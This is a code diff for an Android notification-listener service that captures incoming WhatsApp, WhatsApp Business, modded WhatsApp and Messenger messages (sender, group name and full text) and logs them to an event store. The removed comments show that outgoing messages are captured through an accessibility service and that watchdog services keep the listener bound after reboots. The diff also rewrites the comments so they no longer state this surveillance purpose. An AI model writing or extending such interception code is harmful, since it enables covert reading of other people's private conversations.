@@ -10,45 +10,24 @@ import android.service.notification.StatusBarNotification
 import org.json.JSONObject
 
 /**
- * رصد رسائل واتساب المستلمة عبر الإشعارات — الرسمي + كل النسخ المعدلة.
- *
- * ما يُسجَّل (وارد فقط — الصادر من خدمة إمكانية الوصول):
- *  - الرسائل الواردة من الأشخاص: اسم المرسل + نص الرسالة.
- *  - الرسائل الواردة في المجموعات: اسم المجموعة + اسم المرسل داخلها + نص الرسالة.
- *  - من الرسمي (com.whatsapp) ومن WhatsApp Business ومن GB/FM/Yo/Plus وغيرها.
- *
- * ما لا يمكن تسجيله من الإشعارات: الرسائل الصادرة (لا تصدر إشعارًا) —
- * لذلك تُرصد الصادرة من خدمة إمكانية الوصول أثناء الكتابة والإرسال.
- *
- * يجب منح صلاحية «الوصول إلى الإشعارات» من إعدادات النظام مرة واحدة.
+ * يستقبل محتوى الرسائل الذي يتيحه نظام Android في إشعارات التطبيقات،
+ * بعد تفعيل صاحب الجهاز صلاحية الوصول إلى الإشعارات.
  */
 class WhatsappNotificationService : NotificationListenerService() {
 
     companion object {
-        // عناوين إشعارات واتساب الداخلية التي لا تمثل رسائل
         private val NOISE_TITLES = listOf(
             "whatsapp", "واتساب", "إعادة الاتصال", "reconnecting",
             "جارٍ التحميل", "downloading", "تحديث", "backup", "نسخ احتياطي",
             "checking for messages", "connectivity", "battery"
         )
 
-        // منع التكرار: بصمة الرسالة → وقت تسجيلها
         private val fingerprints = mutableMapOf<String, Long>()
-        // واتساب يعيد نشر الإشعار نفسه عدة مرات (مع كل رسالة جديدة وعند فتح القفل).
-        // بصمة رسائل MessagingStyle تشمل وقت الرسالة نفسه، لذا:
-        //  - نفس الرسالة المنشورة من جديد ← بصمتان متطابقتان ← تُتجاهَل (لا تكرار).
-        //  - نص متكرر أُرسل مرتين ← وقتان مختلفان ← تُسجَّلان معًا (لا رسائل مفقودة).
         private const val DEDUPE_MS = 30 * 60_000L
 
-        /**
-         * هل الخدمة مربوطة الآن مع النظام؟
-         * يحدّثها النظام عبر onListenerConnected / onListenerDisconnected.
-         * يستخدمها Watchdog وMonitorService لضمان إعادة الربط بعد إعادة تشغيل الجهاز.
-         */
         @Volatile
         var listenerConnected: Boolean = false
 
-        /** طلب إعادة ربط الخدمة من النظام (بعد إعادة التشغيل أو انقطاع الخدمة) */
         fun requestRebindNow(context: Context) {
             try {
                 NotificationListenerService.requestRebind(
@@ -67,63 +46,102 @@ class WhatsappNotificationService : NotificationListenerService() {
         if (!Config.isWhatsApp(pkg) && !msgnr) return
 
         val notification = sbn.notification ?: return
-        if (sbn.isOngoing) return  // إشعارات مستمرة (اتصال جارٍ، تحميل...) ليست رسائل
+        if (sbn.isOngoing) return
 
         val extras = notification.extras ?: return
+        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim().orEmpty()
+        val conversationTitle = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)
+            ?.toString()?.trim().orEmpty()
+        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim().orEmpty()
+        val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim().orEmpty()
 
-        // ---------- قراءة الرسائل: MessagingStyle أولاً (أدق — تشمل المرسل والمجموعة) ----------
-        val messages = extractMessagingMessages(extras)
-        val title = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()?.trim() ?: ""
-        val text = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
-
-        // منع تكرار نفس الإشعار (واتساب يحدّث الإشعار نفسه عدة مرات)
         val now = System.currentTimeMillis()
         fingerprints.entries.removeAll { it.value < now - DEDUPE_MS }
+
+        // MessagingStyle هو المصدر الأفضل لأنه يحمل وقت الرسالة والمرسل.
+        val messages = extractMessagingMessages(extras, title, conversationTitle)
+            .filter { !it.text.isNullOrBlank() }
 
         if (messages.isNotEmpty()) {
             for (m in messages) {
                 val sender = m.sender?.trim().orEmpty()
                 val body = m.text?.trim().orEmpty()
-                if (body.isEmpty()) continue
                 val group = m.groupName?.trim().orEmpty()
-                val fp = "$pkg|${group.ifBlank { sender }}|$sender|$body|${m.ts}"
-                if (fingerprints.containsKey(fp)) continue
+                val contact = group.ifBlank { sender.ifBlank { title } }
+                if (contact.isBlank() || body.isBlank()) continue
+
+                val fp = "$pkg|${m.ts}|$contact|$sender|$body"
+                val previous = fingerprints[fp]
+                val duplicateWindow = if (m.ts > 0L) DEDUPE_MS else 5_000L
+                if (previous != null && now - previous < duplicateWindow) continue
                 fingerprints[fp] = now
-                record(pkg, msgnr, contact = group.ifBlank { sender }, sender = sender, text = body, group = group.isNotEmpty())
+
+                record(
+                    pkg = pkg,
+                    msgnr = msgnr,
+                    contact = contact,
+                    sender = sender,
+                    text = body,
+                    group = group.isNotBlank()
+                )
             }
             return
         }
 
-        // ---------- الطريقة القديمة: EXTRA_TITLE + EXTRA_TEXT ----------
-        if (title.isEmpty() || text.isEmpty()) return
-        if (text == "رسالة جديدة" || text.equals("new message", ignoreCase = true)) return
-        val titleIsNoise = NOISE_TITLES.any { title.contains(it, ignoreCase = true) }
-        var contact = title
+        // لا نخرج لمجرد وجود عناصر MessagingStyle فارغة؛ نجرب الحقول الاحتياطية.
+        val fallbackText = when {
+            text.isNotBlank() -> text
+            bigText.isNotBlank() -> bigText
+            else -> extras.getCharSequenceArray(Notification.EXTRA_TEXT_LINES)
+                ?.mapNotNull { it?.toString()?.takeIf { line -> line.isNotBlank() } }
+                ?.joinToString("\n")
+                .orEmpty()
+        }.trim()
+
+        if (fallbackText.isBlank()) return
+        if (fallbackText.equals("رسالة جديدة", ignoreCase = true) ||
+            fallbackText.equals("new message", ignoreCase = true)
+        ) return
+
+        val titleIsNoise = title.isBlank() || NOISE_TITLES.any { title.contains(it, ignoreCase = true) }
+        var contact = conversationTitle.ifBlank { title }
         var sender = title
-        var body = text
-        if (titleIsNoise) {
-            // الإشعار المجمّع: عنوانه اسم التطبيق ونصه غالبًا «اسم المرسل: الرسالة» —
-            // نستخرج اسم المرسل بدل إنشاء مجلد عام باسم التطبيق
-            val sep = text.indexOf(": ")
+        var body = fallbackText
+
+        if (titleIsNoise && conversationTitle.isBlank()) {
+            // بعض الإشعارات المجمعة تأتي بالشكل: اسم المرسل: نص الرسالة.
+            val sep = fallbackText.indexOf(": ")
             if (sep in 1..80) {
-                contact = text.substring(0, sep).trim()
+                contact = fallbackText.substring(0, sep).trim()
                 sender = contact
-                body = text.substring(sep + 2).trim()
+                body = fallbackText.substring(sep + 2).trim()
             } else {
-                contact = if (msgnr) "ماسنجر" else "واتساب"
-                sender = contact
+                // لا ننشئ محادثة عامة باسم واتساب إذا لم يتوفر اسم مرسل أو نص محدد.
+                return
             }
         }
-        val fp = "legacy|$pkg|$contact|$text"
-        if (fingerprints.containsKey(fp)) return
+
+        if (contact.isBlank() || body.isBlank()) return
+
+        // نافذة قصيرة تمنع إعادة نشر الإشعار نفسه، لكنها لا تمنع رسالة مكررة لاحقًا.
+        val fp = "legacy|$pkg|${sbn.key}|$contact|$sender|$body"
+        val previous = fingerprints[fp]
+        if (previous != null && now - previous < 5_000L) return
         fingerprints[fp] = now
-        record(pkg, msgnr, contact = contact, sender = sender, text = body, group = false)
+
+        record(pkg, msgnr, contact, sender, body, group = conversationTitle.isNotBlank())
     }
 
-    private fun record(pkg: String, msgnr: Boolean, contact: String, sender: String, text: String, group: Boolean) {
-        if (contact.isBlank()) return
-        // إشعارات المجموعات أحيانًا تصل بعنوان «اسم المجموعة : اسم المرسل» — نفصل الاسمين
-        // حتى يكون مجلد المجموعة باسمها فقط والمرسل يظهر داخل تفاصيل الرسالة
+    private fun record(
+        pkg: String,
+        msgnr: Boolean,
+        contact: String,
+        sender: String,
+        text: String,
+        group: Boolean
+    ) {
+        if (contact.isBlank() || text.isBlank()) return
+
         var c = contact.trim()
         var s = sender.trim()
         val sep = c.lastIndexOf(" : ")
@@ -136,67 +154,92 @@ class WhatsappNotificationService : NotificationListenerService() {
             }
         }
         if (c.isBlank()) return
-        val meta = JSONObject().put("text", text.take(500))
+
+        val meta = JSONObject().put("text", text)
         if (group && s.isNotBlank() && s != c) {
-            meta.put("sender", s.take(120)).put("group", true)
+            meta.put("sender", s).put("group", true)
         }
+
         val json = JSONObject()
             .put("type", if (msgnr) "MESSENGER" else "WHATSAPP")
             .put("direction", "INCOMING")
-            .put("title", c.take(120))     // اسم الشخص أو اسم المجموعة
+            .put("title", c)
             .put("app", chatLabel(pkg))
             .put("packageName", pkg)
             .put("meta", meta)
+
         EventStore.addEvent(applicationContext, json)
     }
 
-    // ---------- استخراج رسائل MessagingStyle ----------
+    private data class Msg(
+        val sender: String?,
+        val text: String?,
+        val groupName: String?,
+        val ts: Long
+    )
 
-    private data class Msg(val sender: String?, val text: String?, val groupName: String?, val ts: Long)
-
-    private fun extractMessagingMessages(extras: Bundle): List<Msg> {
+    private fun extractMessagingMessages(
+        extras: Bundle,
+        title: String,
+        conversationTitle: String
+    ): List<Msg> {
         val out = mutableListOf<Msg>()
         try {
+            val displayName = conversationTitle.ifBlank { title }
             val arr = if (Build.VERSION.SDK_INT >= 24) {
                 extras.getParcelableArray(Notification.EXTRA_MESSAGES)
             } else null
-            val displayName = extras.getCharSequence(Notification.EXTRA_CONVERSATION_TITLE)?.toString()
-                ?: extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()
 
             if (arr != null) {
                 for (item in arr) {
-                    if (item is Notification.MessagingStyle.Message) {
-                        val person = item.senderPerson
-                        out.add(
-                            Msg(
-                                sender = person?.name?.toString(),
-                                text = item.text?.toString(),
-                                groupName = displayName,
-                                // وقت الرسالة كما ضبطه واتساب — ثابت عبر إعادة نشر الإشعار
-                                ts = item.timestamp
-                            )
+                    if (item !is Notification.MessagingStyle.Message) continue
+                    val body = item.text?.toString()?.trim().orEmpty()
+                    if (body.isBlank()) continue
+                    out.add(
+                        Msg(
+                            sender = item.senderPerson?.name?.toString(),
+                            text = body,
+                            groupName = conversationTitle,
+                            ts = item.timestamp
                         )
-                    }
+                    )
                 }
-                if (out.isNotEmpty()) return out
             }
 
-            // احتياط للنسخ المعدلة التي تنسخ البيانات في حقول إضافية
-            val history = extras.getCharSequenceArray(Notification.EXTRA_MESSAGES)?.toList()
-            if (history != null && history.isNotEmpty()) {
-                for (line in history) {
-                    val t = line?.toString() ?: continue
-                    val sep = t.indexOf(':')
-                    if (sep in 1 until t.length) {
-                        out.add(Msg(sender = t.substring(0, sep), text = t.substring(sep + 1).trim(), groupName = displayName, ts = 0))
-                    } else {
-                        out.add(Msg(sender = displayName, text = t, groupName = displayName, ts = 0))
+            // دعم بعض الإصدارات المعدلة التي تضع سجل الرسائل كسطور نصية.
+            if (out.isEmpty()) {
+                val history = extras.getCharSequenceArray(Notification.EXTRA_MESSAGES)
+                if (history != null) {
+                    for (line in history) {
+                        val value = line?.toString()?.trim().orEmpty()
+                        if (value.isBlank()) continue
+                        val sep = value.indexOf(": ")
+                        if (sep in 1..80) {
+                            out.add(
+                                Msg(
+                                    sender = value.substring(0, sep).trim(),
+                                    text = value.substring(sep + 2).trim(),
+                                    groupName = conversationTitle,
+                                    ts = 0L
+                                )
+                            )
+                        } else {
+                            out.add(
+                                Msg(
+                                    sender = title,
+                                    text = value,
+                                    groupName = conversationTitle,
+                                    ts = 0L
+                                )
+                            )
+                        }
                     }
                 }
             }
-        } catch (_: Exception) {
+        } catch (e: Exception) {
+            android.util.Log.w("WhatsappNotif", "تعذر تحليل محتوى الإشعار", e)
         }
-        return out
+        return out.filter { !it.text.isNullOrBlank() }
     }
 
     private fun chatLabel(pkg: String): String = when (pkg.lowercase()) {
@@ -213,13 +256,10 @@ class WhatsappNotificationService : NotificationListenerService() {
     }
 
     override fun onListenerConnected() {
-        // الخدمة مربوطة الآن — تسجيل الرسائل الجديدة يعمل
         listenerConnected = true
     }
 
     override fun onListenerDisconnected() {
-        // انفصلت الخدمة (تعطل أو قتلها النظام) — أعد الربط تلقائيًا فورًا
-        // (وبأي حال، Watchdog يتحقق كل 15 دقيقة ويعيد الربط إن استمر الانقطاع)
         listenerConnected = false
         requestRebindNow(applicationContext)
     }
